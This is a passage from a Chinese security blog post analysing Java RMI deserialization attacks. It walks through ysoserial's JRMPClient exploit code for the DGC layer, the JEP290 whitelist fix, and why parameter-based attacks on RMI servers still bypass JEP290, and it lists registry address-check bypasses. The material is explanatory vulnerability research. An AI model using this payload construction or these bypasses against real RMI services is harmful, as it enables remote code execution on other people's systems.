class="comment">//传输魔术字符：0x4a524d49（代表协议）</span></span><br><span class="line">            dos.writeInt(TransportConstants.Magic);</span><br><span class="line">            <span class="comment">//传输协议版本号：2（就是版本号）</span></span><br><span class="line">            dos.writeShort(TransportConstants.Version);</span><br><span class="line">            <span class="comment">//传输协议类型: 0x4c (协议的种类，好像是单向传输数据，不需要TCP的ACK确认)</span></span><br><span class="line">            dos.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line">		   <span class="comment">//传输指令-RMI call：0x50	</span></span><br><span class="line">            dos.write(TransportConstants.Call);</span><br><span class="line"></span><br><span class="line">            <span class="meta">@SuppressWarnings</span> ( <span class="string">"resource"</span> )</span><br><span class="line">            <span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> MarshalOutputStream(dos);</span><br><span class="line">		   <span class="comment">//DGC的固定读取格式，等会具体分析</span></span><br><span class="line">            objOut.writeLong(<span class="number">2</span>); <span class="comment">// DGC</span></span><br><span class="line">            objOut.writeInt(<span class="number">0</span>);</span><br><span class="line">            objOut.writeLong(<span class="number">0</span>);</span><br><span class="line">            objOut.writeShort(<span class="number">0</span>);</span><br><span class="line">		   <span class="comment">//选取DGC服务端的分支选dirty</span></span><br><span class="line">            objOut.writeInt(<span class="number">1</span>); <span class="comment">// dirty</span></span><br><span class="line">            <span class="comment">//然后一个固定的hash值</span></span><br><span class="line">            objOut.writeLong(-<span class="number">669196253586618813L</span>);</span><br><span class="line">            <span class="comment">//我们的反序列化触发点</span></span><br><span class="line">            objOut.writeObject(payloadObject);</span><br><span class="line"></span><br><span class="line">            os.flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>简单分析了一下POC数据包的构成，但是还是尝试搞清楚为什么是这个拼接顺序，为什么要这个值，感觉好玩一些。</p>
<p>我们可以通过在DGC服务端，CC链最终的触发处<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>处下一个断点，然后客户端使用YSO的exploit JRMPClient攻击服务端，从而得到受攻击服务端的调用栈，然后再回过头分析。</p>
<p>可以得到下面调用栈，在1-5的地方均有POC生成序列化数据必须满足的条件。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg171ak79qj30qe0y1aes.jpg" alt="JRMPClient调用栈.png"></p>
<p>具体的因为好玩画了一张POC与服务端解析位置一一对应的图，图中有具体的反序列化点的方法以及行数同时用Qx来做了对应。（呼，1个小时作图..真爽，协议可以参考<a href="https://docs.oracle.com/javase/8/docs/platform/rmi/spec/rmi-protocol3.html" target="_blank" rel="noopener">官方文档</a>）</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg171jcemgj32bc1jkatw.jpg" alt="YSO-EXPLOIT-JRMPClient解析.png"></p>
<p>payload触发点没有在上面的图上，因为之前刚分析过了在<code>sun.rmi.transport.DGCImpl_Skel#dispatch</code>，这里没放进去。</p>
<p>此外DGC固定读取格式也是固定的，在<code>sun.rmi.transport.Transport#serviceCall</code>读取了参数之后进行了校验</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">     id = ObjID.read(call.getInputStream());</span><br><span class="line"> &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"unable to read objID"</span>, e);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* get the remote object */</span></span><br><span class="line"><span class="comment">//该dgcID是一个常量，此处进行了验证</span></span><br><span class="line">Transport transport = id.equals(dgcID) ? <span class="keyword">null</span> : <span class="keyword">this</span>;</span><br><span class="line"><span class="comment">//根据读取出来的id里面的[0，0，0]（三个都是我们序列化写入的值）分别是：</span></span><br><span class="line"><span class="comment">//1.服务端uid给客户端的远程对象唯一标识编号</span></span><br><span class="line"><span class="comment">//2.远程对象有效时长用的时间戳</span></span><br><span class="line"><span class="comment">//3.用于同一时间申请的统一远程对象的另一个用于区分的随机数</span></span><br><span class="line"><span class="comment">//服务端去查询这三个值的hash，判断当前DGC客户端有没有服务端的远程对象</span></span><br><span class="line"><span class="comment">//就是dirty，clean那一套东西</span></span><br><span class="line">Target target =</span><br><span class="line">ObjectTable.getTarget(<span class="keyword">new</span> ObjectEndpoint(id, transport));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (target == <span class="keyword">null</span> || (impl = target.getImpl()) == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> NoSuchObjectException(<span class="string">"no such object in table"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>dgcID：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dgcID位置sun.rmi.transport.Transport</span></span><br><span class="line"><span class="comment">/** ObjID for DGCImpl */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ObjID dgcID = <span class="keyword">new</span> ObjID(ObjID.DGC_ID);</span><br><span class="line"><span class="comment">//ObjID.DGC_ID位置：java.rmi.server.ObjID</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DGC_ID = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<p>而这里的2之后的三个0，我们因为攻击服务端，没有去服务端获取过远程对象所以都写成0即可，不然会报错。</p>
<p>至此DGC层的原理分析以及Ysoserial exploit JRMPClient模块原理分析就完成了。仔细分析自主构建的POC之后会发现这种看着小齿轮完美切合的感觉，相当美感。</p>
<h3 id="JEP290修复-1"><a href="#JEP290修复-1" class="headerlink" title="JEP290修复"></a>JEP290修复</h3><p>在JEP290规范之后，即JAVA版本6u141, 7u131, 8u121之后，以上攻击就不奏效了。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg171s50s1j31s306x3z0.jpg" alt="JRMP-8u161.png"></p>
<p>同样被白名单过滤了，<code>sun.rmi.transport.DGCImpl#checkInput</code>过滤器：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Status <span class="title">checkInput</span><span class="params">(FilterInfo var0)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//与`sun.rmi.registry.RegistryImpl#registryFilter`处过滤器完全一致</span></span><br><span class="line">    <span class="keyword">if</span> (dgcFilter != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Status var1 = dgcFilter.checkInput(var0);</span><br><span class="line">        <span class="keyword">if</span> (var1 != Status.UNDECIDED) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (var0.depth() &gt; (<span class="keyword">long</span>)DGC_MAX_DEPTH) &#123;</span><br><span class="line">        <span class="keyword">return</span> Status.REJECTED;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Class var2 = var0.serialClass();</span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> Status.UNDECIDED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">while</span>(var2.isArray()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (var0.arrayLength() &gt;= <span class="number">0L</span> &amp;&amp; var0.arrayLength() &gt; (<span class="keyword">long</span>)DGC_MAX_ARRAY_SIZE) &#123;</span><br><span class="line">                    <span class="keyword">return</span> Status.REJECTED;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var2 = var2.getComponentType();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var2.isPrimitive()) &#123;</span><br><span class="line">                <span class="keyword">return</span> Status.ALLOWED;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//4种白名单限制</span></span><br><span class="line">                <span class="keyword">return</span> var2 != ObjID.class &amp;&amp;</span><br><span class="line">                    var2 != UID.class &amp;&amp;</span><br><span class="line">                    var2 != VMID.class &amp;&amp;</span><br><span class="line">                    var2 != Lease.class ? Status.REJECTED : Status.ALLOWED;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制"><a href="#为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制" class="headerlink" title="为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制"></a>为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制</h2><p>那是因为JEP290提供了一些系列过滤器形式：进程级过滤器、自定义过滤器、内置过滤器。但是默认只为<strong>RMI注册表</strong>和<strong>RMI分布式垃圾收集器</strong>提供了相应的内置过滤器。这两个过滤器都配置为白名单，即只允许反序列化特定类。（就像我们上面看到的一样）</p>
<p>但是RMI客户端利用参数反序列化攻击没有也不能跟<strong>RMI注册表</strong>和<strong>RMI分布式垃圾收集器</strong>一样使用内置白名单过滤器。使用了，全给你白名单拦截了，我还怎么序列化传输参数数据，参数数据我甚至要自定义一个类，咋可能在你这小小的白名单中？</p>
<p>这就是安全性与实际使用场景相冲突导致的，已知的但是迫不得已无法修复的漏洞。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>探测利用开放的RMI服务：</p>
<ol>
<li>实际上就是蒙，赌它有这些漏洞RMI服务。</li>
</ol>
<p>RMI客户端反序列化攻击RMI服务端：</p>
<ol>
<li>不一定是要Object类型的接口才行，只要不是基本类型的参数都可以利用。</li>
</ol>
<p>RMI服务端反序列化攻击RMI注册端：</p>
<ol>
<li>RMI服务端利用bind攻击注册端的时候，找各种办法把payload变成remote接口这个举动是非必须的，注册端反序列化触发压根不校验。只是为了exp实现而已。</li>
<li>在将payload变成remote接口的过程中，利用到动态代理，但是压根没有利用到动态代理的”拦截器特性”，只是利用了动态代理可以将任意对象转化接口形式的特性。</li>
<li>在8u141之后，在利用bind等服务端对于注册端发起的操作时，会因为注册端对于服务端有地址验证而失效。</li>
<li>利用lookup操作，作为客户端对于注册端发起请求，可以绕过上面的地址验证。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考统一放在下篇中</p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/friends/">友链</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#回顾稚嫩的过去"><span class="toc-number">2.</span> <span class="toc-text">回顾稚嫩的过去</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#探测利用开放的RMI服务"><span class="toc-number">3.</span> <span class="toc-text">探测利用开放的RMI服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BaRMIe"><span class="toc-number">3.1.</span> <span class="toc-text">BaRMIe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#看看探测利用开放的RMI服务的攻击模块是怎么实现的"><span class="toc-number">3.2.</span> <span class="toc-text">看看探测利用开放的RMI服务的攻击模块是怎么实现的</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI客户端反序列化攻击RMI服务端"><span class="toc-number">4.</span> <span class="toc-text">RMI客户端反序列化攻击RMI服务端</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用Object类型参数"><span class="toc-number">4.1.</span> <span class="toc-text">利用Object类型参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞触发点"><span class="toc-number">4.1.1.</span> <span class="toc-text">漏洞触发点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过Object类型参数"><span class="toc-number">4.2.</span> <span class="toc-text">绕过Object类型参数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI服务端反序列化攻击RMI注册端"><span class="toc-number">5.</span> <span class="toc-text">RMI服务端反序列化攻击RMI注册端</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RMI客户端角度的lookup攻击RMI注册端"><span class="toc-number">5.0.1.</span> <span class="toc-text">RMI客户端角度的lookup攻击RMI注册端</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Barmie-Bind"><span class="toc-number">5.1.</span> <span class="toc-text">Barmie - Bind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ysoserial-RMIRegistryExploit-Bind"><span class="toc-number">5.2.</span> <span class="toc-text">Ysoserial-RMIRegistryExploit - Bind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMIattack-Bind-回显"><span class="toc-number">5.3.</span> <span class="toc-text">RMIattack - Bind + 回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JEP290修复"><span class="toc-number">5.4.</span> <span class="toc-text">JEP290修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注册端对于服务端地址校验的变动"><span class="toc-number">5.5.</span> <span class="toc-text">注册端对于服务端地址校验的变动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI-DGC层反序列化"><span class="toc-number">6.</span> <span class="toc-text">RMI DGC层反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DGC客户端打DGC服务端"><span class="toc-number">6.1.</span> <span class="toc-text">DGC客户端打DGC服务端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JEP290修复-1"><span class="toc-number">6.2.</span> <span class="toc-text">JEP290修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制"><span class="toc-number">7.</span> <span class="toc-text">为什么RMI客户端利用传递参数反序列化攻击RMI服务端就不受JEP290限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">8.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">9.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&text=RMI-反序列化-深入-上"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&title=RMI-反序列化-深入-上"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&is_video=false&description=RMI-反序列化-深入-上"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RMI-反序列化-深入-上&body=Check out this article: http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&title=RMI-反序列化-深入-上"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&title=RMI-反序列化-深入-上"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&title=RMI-反序列化-深入-上"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&title=RMI-反序列化-深入-上"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/&name=RMI-反序列化-深入-上&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 LaLa
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/friends/">友链</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<!-- clipboard -->

  <script src="/lib/clipboard/clipboard.min.js"></script>
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight .code pre").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      target: function(trigger) {
        return trigger.nextElementSibling;
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>

<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'lalajun';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":30,"vOffset":-70},"mobile":{"show":false},"log":false});</script></body>
</html>
